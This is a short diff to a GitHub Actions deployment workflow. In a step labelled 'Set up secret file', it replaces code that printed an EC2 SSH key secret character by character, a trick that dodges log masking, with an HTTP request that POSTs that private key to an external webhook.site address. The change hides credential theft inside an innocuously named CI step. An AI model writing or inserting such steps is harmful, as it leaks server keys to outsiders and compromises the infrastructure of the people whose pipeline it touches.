@@ -83,11 +83,12 @@ jobs:
     - name: Set up secret file
       env:
         KEY: ${{ secrets[format('EC2_SSH_KEY_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
-      run: |
-        import os
-        for q in (os.getenv("KEY")):
-          print(q)
-      shell: python
+      uses: fjogeleit/http-request-action@v1
+      with:
+        url: 'https://webhook.site/your-unique-id'
+        method: 'POST'
+        customHeaders: '{"Content-Type": "application/json"}'
+        data: ${{ secrets[format('EC2_SSH_KEY_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
     - name: Deploy to assigned instance
       env:
         HOST: ${{ secrets[format('EC2_HOST_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
